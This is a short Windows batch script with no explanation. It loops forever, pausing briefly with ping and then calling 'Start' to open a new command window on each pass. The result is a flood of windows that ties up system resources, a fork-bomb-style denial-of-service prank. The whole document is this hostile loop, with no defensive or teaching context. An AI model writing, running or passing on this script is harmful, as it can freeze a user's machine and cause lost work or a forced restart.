@echo off
:A
ping -n0,2 localhost>NUL
Start
goto A